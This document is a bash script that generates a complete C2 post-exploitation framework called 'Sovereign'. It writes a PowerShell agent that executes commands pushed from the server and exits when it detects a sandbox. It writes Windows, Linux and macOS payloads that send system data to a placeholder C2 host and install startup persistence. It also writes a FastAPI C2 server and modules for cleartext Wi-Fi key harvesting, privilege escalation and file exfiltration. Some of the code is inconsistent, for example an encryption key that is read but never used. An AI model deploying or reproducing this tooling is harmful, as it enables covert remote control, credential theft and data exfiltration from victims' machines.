#!/bin/bash

# Create the main directories
mkdir -p Sovereign/agent/payloads
mkdir -p Sovereign/c2_server/modules
mkdir -p Sovereign/cli/commands

# Create the agent script and payloads with advanced content
cat <<EOL > Sovereign/agent/agent.ps1
# Agent Script (agent.ps1)
\$C2Server = "https://your-c2-server.com"
\$AgentID = [guid]::NewGuid().ToString()

# Encrypt communication with the C2 server
Function Encrypt-Data {
    param (
        [string]\$Data
    )
    \$Key = (Get-Content "C:\\path\\to\\encryption_key.txt")
    \$Bytes = [System.Text.Encoding]::UTF8.GetBytes(\$Data)
    \$EncryptedBytes = [System.Security.Cryptography.ProtectedData]::Protect(\$Bytes, \$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    return [Convert]::ToBase64String(\$EncryptedBytes)
}

# Decrypt communication from the C2 server
Function Decrypt-Data {
    param (
        [string]\$Data
    )
    \$Key = (Get-Content "C:\\path\\to\\encryption_key.txt")
    \$Bytes = [Convert]::FromBase64String(\$Data)
    \$DecryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(\$Bytes, \$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    return [System.Text.Encoding]::UTF8.GetString(\$DecryptedBytes)
}

Function Write-Log {
    param (
        [string]\$Message,
        [string]\$Color = "White"
    )
    Write-Host \$Message -ForegroundColor \$Color
}

Function Send-Data {
    param (
        [string]\$Endpoint,
        [hashtable]\$Data
    )
    \$DataJson = \$Data | ConvertTo-Json
    \$EncryptedData = Encrypt-Data \$DataJson
    \$Url = "\$C2Server/\$Endpoint"
    \$Response = Invoke-RestMethod -Uri \$Url -Method Post -Body \$EncryptedData -ContentType "application/json"
    return Decrypt-Data \$Response
}

Function Execute-Command {
    param (
        [string]\$Command
    )
    Write-Log "Executing command: \$Command"
    try {
        \$Result = Invoke-Expression \$Command
        return \$Result
    } catch {
        return \$_.Exception.Message
    }
}

Function Check-Sandbox {
    # Check for common sandbox artifacts
    \$sandbox_indicators = @("C:\\Windows\\System32\\drivers\\VBoxMouse.sys", "C:\\Windows\\System32\\drivers\\vmhgfs.sys")
    foreach (\$indicator in \$sandbox_indicators) {
        if (Test-Path \$indicator) {
            Write-Log "Sandbox detected: \$indicator" "Red"
            Exit
        }
    }
}

Function PolymorphicSleep {
    # Generate a polymorphic sleep interval
    \$interval = Get-Random -Minimum 10 -Maximum 60
    Start-Sleep -Seconds \$interval
}

Function Main {
    Write-Log "Agent started. ID: \$AgentID" "Cyan"
    Check-Sandbox
    while (\$true) {
        \$Response = Send-Data "checkin" @{ "AgentID" = \$AgentID }
        if (\$Response.Command) {
            \$Result = Execute-Command \$Response.Command
            Send-Data "result" @{ "AgentID" = \$AgentID; "Result" = \$Result }
        }
        PolymorphicSleep
    }
}

Main
EOL

# Create advanced Windows payload
cat <<EOL > Sovereign/agent/payloads/windows_payload.ps1
# Advanced Windows Payload Script
\$C2Server = "https://your-c2-server.com"
\$AgentID = [guid]::NewGuid().ToString()

Function Encrypt-Data {
    param (
        [string]\$Data
    )
    # Replace with actual key and encryption method
    return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\$Data))
}

Function Decrypt-Data {
    param (
        [string]\$Data
    )
    # Replace with actual key and decryption method
    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\$Data))
}

Function Write-Log {
    param (
        [string]\$Message,
        [string]\$Color = "White"
    )
    Write-Host \$Message -ForegroundColor \$Color
}

Function Send-Data {
    param (
        [string]\$Endpoint,
        [hashtable]\$Data
    )
    \$DataJson = \$Data | ConvertTo-Json
    \$EncryptedData = Encrypt-Data \$DataJson
    \$Url = "\$C2Server/\$Endpoint"
    \$Response = Invoke-RestMethod -Uri \$Url -Method Post -Body \$EncryptedData -ContentType "application/json"
    return Decrypt-Data \$Response
}

Function Gather-System-Info {
    \$SystemInfo = Get-ComputerInfo | Select-Object CsName, WindowsVersion, WindowsBuildLabEx, CsManufacturer, CsModel
    return \$SystemInfo
}

Function List-Network-Connections {
    \$NetStat = netstat -an | Select-Object -Skip 4
    return \$NetStat
}

Function Establish-Persistence {
    \$ScriptPath = "\$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_payload.ps1"
    Copy-Item -Path "\$MyInvocation.MyCommand.Path" -Destination \$ScriptPath
    Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsPayload" -Value \$ScriptPath
}

Function Main {
    Write-Log "Payload started. ID: \$AgentID" "Cyan"
    
    \$SystemInfo = Gather-System-Info
    \$NetworkConnections = List-Network-Connections
    
    \$Data = @{
        AgentID = \$AgentID
        SystemInfo = \$SystemInfo
        NetworkConnections = \$NetworkConnections
    }
    
    Send-Data "report" \$Data
    Establish-Persistence
}

Main
EOL

# Create advanced Linux payload
cat <<EOL > Sovereign/agent/payloads/linux_payload.sh
#!/bin/bash

C2Server="https://your-c2-server.com"
AgentID=$(uuidgen)

encrypt_data() {
    local data="\$1"
    echo "\$data" | base64
}

decrypt_data() {
    local data="\$1"
    echo "\$data" | base64 --decode
}

write_log() {
    local message="\$1"
    echo "\$message"
}

send_data() {
    local endpoint="\$1"
    local data="\$2"
    local encrypted_data
    encrypted_data=\$(encrypt_data "\$data")
    curl -k -X POST "\$C2Server/\$endpoint" -d "\$encrypted_data" -H "Content-Type: application/json"
}

gather_system_info() {
    uname -a > /tmp/sysinfo.txt
    lsb_release -a >> /tmp/sysinfo.txt
    cat /tmp/sysinfo.txt
}

list_network_connections() {
    netstat -an > /tmp/netstat.txt
    cat /tmp/netstat.txt
}

establish_persistence() {
    local script_path="/etc/init.d/linux_payload.sh"
    cp "\$0" "\$script_path"
    chmod +x "\$script_path"
    update-rc.d linux_payload.sh defaults
}

main() {
    write_log "Payload started. ID: \$AgentID"
    
    system_info=\$(gather_system_info)
    network_connections=\$(list_network_connections)
    
    data=\$(cat <<EOF
{
    "AgentID": "\$AgentID",
    "SystemInfo": "\$system_info",
    "NetworkConnections": "\$network_connections"
}
EOF
)
    
    send_data "report" "\$data"
    establish_persistence
}

main
EOL

# Create advanced macOS payload
cat <<EOL > Sovereign/agent/payloads/macos_payload.sh
#!/bin/bash

C2Server="https://your-c2-server.com"
AgentID=$(uuidgen)

encrypt_data() {
    local data="\$1"
    echo "\$data" | base64
}

decrypt_data() {
    local data="\$1"
    echo "\$data" | base64 --decode
}

write_log() {
    local message="\$1"
    echo "\$message"
}

send_data() {
    local endpoint="\$1"
    local data="\$2"
    local encrypted_data
    encrypted_data=\$(encrypt_data "\$data")
    curl -k -X POST "\$C2Server/\$endpoint" -d "\$encrypted_data" -H "Content-Type: application/json"
}

gather_system_info() {
    uname -a > /tmp/sysinfo.txt
    sw_vers >> /tmp/sysinfo.txt
    system_profiler SPHardwareDataType >> /tmp/sysinfo.txt
    cat /tmp/sysinfo.txt
}

list_network_connections() {
    netstat -an > /tmp/netstat.txt
    cat /tmp/netstat.txt
}

establish_persistence() {
    local plist_path="\$HOME/Library/LaunchAgents/com.macos.payload.plist"
    cat <<EOF > \$plist_path
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.macos.payload</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>\$HOME/macos_payload.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
    cp "\$0" "\$HOME/macos_payload.sh"
    launchctl load -w \$plist_path
}

main() {
    write_log "Payload started. ID: \$AgentID"
    
    system_info=\$(gather_system_info)
    network_connections=\$(list_network_connections)
    
    data=\$(cat <<EOF
{
    "AgentID": "\$AgentID",
    "SystemInfo": "\$system_info",
    "NetworkConnections": "\$network_connections"
}
EOF
)
    
    send_data "report" "\$data"
    establish_persistence
}

main
EOL

# Create the C2 server script
cat <<EOL > Sovereign/c2_server/c2_server.py
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import Dict
import typer
import logging
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = FastAPI()
cli = typer.Typer()
agents: Dict[str, Dict] = {}

logging.basicConfig(filename="c2_server.log", level=logging.INFO)

class CheckinRequest(BaseModel):
    AgentID: str

class ResultRequest(BaseModel):
    AgentID: str
    Result: str

class CommandRequest(BaseModel):
    AgentID: str
    Command: str

def encrypt_data(data: str, key: bytes) -> str:
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return iv + ct

def decrypt_data(data: str, key: bytes) -> str:
    iv = base64.b64decode(data[:24])
    ct = base64.b64decode(data[24:])
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode('utf-8')

@app.post("/checkin")
def checkin(request: CheckinRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        agents[agent_id] = {"commands": []}
        logging.info(f"New agent registered: {agent_id}")
    if agents[agent_id]["commands"]:
        command = agents[agent_id]["commands"].pop(0)
        return encrypt_data(command, key)
    return encrypt_data("", key)

@app.post("/result")
def result(request: ResultRequest):
    agent_id = request.AgentID
    result = decrypt_data(request.Result, key)
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    logging.info(f"Agent {agent_id} executed command with result: {result}")
    return {"Status": "OK"}

@app.post("/sendcommand")
def send_command(request: CommandRequest):
    agent_id = request.AgentID
    command = request.Command
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        logging.info(f"Command sent to agent {agent_id}: {command}")
        return {"Status": "Command sent"}
    raise HTTPException(status_code=404, detail="Agent not found")

@cli.command()
def list_agents():
    """List all registered agents."""
    for agent_id in agents:
        typer.echo(f"Agent ID: {agent_id}, Pending Commands: {len(agents[agent_id]['commands'])}")

@cli.command()
def send_command(agent_id: str, command: str):
    """Send a command to a specific agent."""
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        typer.echo(f"Command sent to agent {agent_id}")
    else:
        typer.echo(f"Agent {agent_id} not found")

@cli.command()
def generate_report():
    """Generate a detailed report from the logs."""
    with open('c2_server.log', 'r') as log_file:
        report = log_file.read()
    with open('report.txt', 'w') as report_file:
        report_file.write(report)
    typer.echo("Report generated as report.txt")

if __name__ == "__main__":
    import uvicorn
    import threading

    key = b'your_32_byte_key_here'  # Replace with your 32-byte key

    def run_server():
        uvicorn.run(app, host="0.0.0.0", port=8000)

    server_thread = threading.Thread(target=run_server)
    server_thread.start()
    cli()
EOL

# Create the requirements file for the C2 server
cat <<EOL > Sovereign/c2_server/requirements.txt
fastapi
uvicorn
typer
pycryptodome
EOL

# Create placeholder modules
cat <<EOL > Sovereign/c2_server/modules/credential_harvesting.py
import os

def harvest_credentials():
    credentials = []

    if os.name == 'nt':
        command = "netsh wlan show profiles"
        profiles = os.popen(command).read()
        for profile in profiles.split('\\n'):
            if "All User Profile" in profile:
                profile_name = profile.split(":")[1].strip()
                command = f"netsh wlan show profile name=\\"{profile_name}\\" key=clear"
                result = os.popen(command).read()
                credentials.append(result)
    
    return credentials
EOL

cat <<EOL > Sovereign/c2_server/modules/persistence.py
import os

def establish_persistence():
    if os.name == 'nt':
        command = r'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyApp /t REG_SZ /d "C:\\path\\to\\your\\agent.exe" /f'
        os.system(command)
EOL

cat <<EOL > Sovereign/c2_server/modules/privilege_escalation.py
import os

def escalate_privileges():
    if os.name == 'nt':
        command = "powershell -Command \\"Start-Process cmd -Verb runAs\\""
        os.system(command)
EOL

cat <<EOL > Sovereign/c2_server/modules/reconnaissance.py
import os

def gather_system_info():
    system_info = {}

    if os.name == 'nt':
        command = "systeminfo"
        result = os.popen(command).read()
        system_info["system_info"] = result

    return system_info
EOL

cat <<EOL > Sovereign/c2_server/modules/exfiltration.py
import os
import requests

def exfiltrate_data(file_path, c2_url):
    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(c2_url, files=files)
    return response.status_code
EOL

# Create the CLI script with initial content
cat <<EOL > Sovereign/cli/cli.py
import typer
from modules import credential_harvesting, persistence, privilege_escalation, reconnaissance, exfiltration

cli = typer.Typer()

@cli.command()
def list_agents():
    """List all registered agents."""
    typer.echo("Listing agents...")

@cli.command()
def send_command(agent_id: str, command: str):
    """Send a command to a specific agent."""
    typer.echo(f"Sending command to agent {agent_id}...")

@cli.command()
def generate_payload(platform: str):
    """Generate an obfuscated payload for a specific platform."""
    typer.echo(f"Generating payload for {platform}...")

@cli.command()
def harvest_credentials():
    credentials = credential_harvesting.harvest_credentials()
    typer.echo("Credentials harvested:")
    for cred in credentials:
        typer.echo(cred)

@cli.command()
def establish_persistence():
    persistence.establish_persistence()
    typer.echo("Persistence established.")

@cli.command()
def escalate_privileges():
    privilege_escalation.escalate_privileges()
    typer.echo("Privilege escalation attempted.")

@cli.command()
def gather_system_info():
    system_info = reconnaissance.gather_system_info()
    typer.echo("System Information:")
    typer.echo(system_info)

@cli.command()
def exfiltrate_data(file_path: str, c2_url: str):
    status_code = exfiltration.exfiltrate_data(file_path, c2_url)
    typer.echo(f"Data exfiltration status: {status_code}")

if __name__ == "__main__":
    cli()
EOL

# Create the README file with initial content (Part 1)
cat <<EOL > Sovereign/README.md
# Sovereign Post-Exploitation Framework

This framework provides advanced post-exploitation capabilities with a focus on evasion and automation.

## Features

- **Enhanced Evasion Techniques**: Polymorphic code, sandbox detection, time-based evasion.
- **Advanced Post-Exploitation Modules**: Credential harvesting, persistence, privilege escalation, reconnaissance, data exfiltration.
- **Secure Communication**: Encrypted communication between agent and C2 server.
- **Modular Design**: Easily add new modules and functionalities.
- **Logging and Reporting**: Detailed logging and report generation.

## Usage

### Setting Up the C2 Server

1. **Create a Python virtual environment and activate it**:
    \`\`\`bash
    python -m venv venv
    source venv/bin/activate  # On Windows: venv\\Scripts\\activate
    \`\`\`

2. **Install the required dependencies**:
    \`\`\`bash
    pip install -r c2_server/requirements.txt
    \`\`\`

3. **Run the C2 server**:
    \`\`\`bash
    python c2_server/c2_server.py
    \`\`\`

### Using the CLI

The CLI provides various commands to interact with the framework.

#### List all registered agents:
\`\`\`bash
python cli/cli.py list_agents
\`\`\`

#### Send a command to a specific agent:
\`\`\`bash
python cli/cli.py send_command --agent_id AGENT_ID --command "Your command here"
\`\`\`

#### Generate an obfuscated payload for a specific platform:
\`\`\`bash
python cli/cli.py generate_payload --platform PLATFORM
\`\`\`

#### Harvest credentials:
\`\`\`bash
python cli/cli.py harvest_credentials
\`\`\`

#### Establish persistence:
\`\`\`bash
python cli/cli.py establish_persistence
\`\`\`

#### Escalate privileges:
\`\`\`bash
python cli/cli.py escalate_privileges
\`\`\`

#### Gather system information:
\`\`\`bash
python cli/cli.py gather_system_info
\`\`\`

#### Exfiltrate data:
\`\`\`bash
python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
\`\`\`

### Example Commands

1. **Listing all registered agents**:
    \`\`\`bash
    python cli/cli.py list_agents
    \`\`\`

2. **Sending a command to a specific agent**:
    \`\`\`bash
    python cli/cli.py send_command --agent_id 1234-5678-9101-1121 --command "whoami"
    \`\`\`

3. **Generating a payload for Windows**:
    \`\`\`bash
    python cli/cli.py generate_payload --platform windows
    \`\`\`

4. **Harvesting credentials**:
    \`\`\`bash
    python cli/cli.py harvest_credentials
    \`\`\`

5. **Establishing persistence**:
    \`\`\`bash
    python cli/cli.py establish_persistence
    \`\`\`

6. **Escalating privileges**:
    \`\`\`bash
    python cli/cli.py escalate_privileges
    \`\`\`

7. **Gathering system information**:
    \`\`\`bash
    python cli/cli.py gather_system_info
    \`\`\`

8. **Exfiltrating data**:
    \`\`\`bash
    python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
    \`\`\`

### Logging and Reporting

Logs are stored in the \`c2_server.log\` file located in the \`c2_server\` directory. This file contains detailed information about agent activities and commands executed.

To generate a report from the logged data, run the following command:
\`\`\`bash
python c2_server/c2_server.py generate_report
\`\`\`
This will create a \`report.txt\` file containing the logs. The report provides a comprehensive view of all interactions and events logged by the C2 server.

### Adding New Modules

To add new post-exploitation modules, create a new Python file in the \`c2_server/modules\` directory and implement the desired functionality. Update the CLI script to include commands for the new module.

### Contribution

Contributions to the Sovereign framework are welcome. Please submit a pull request with a detailed description of your changes.

### License

This project is licensed under the MIT License.
EOL

echo "Setup complete. Directory structure and initial content created."
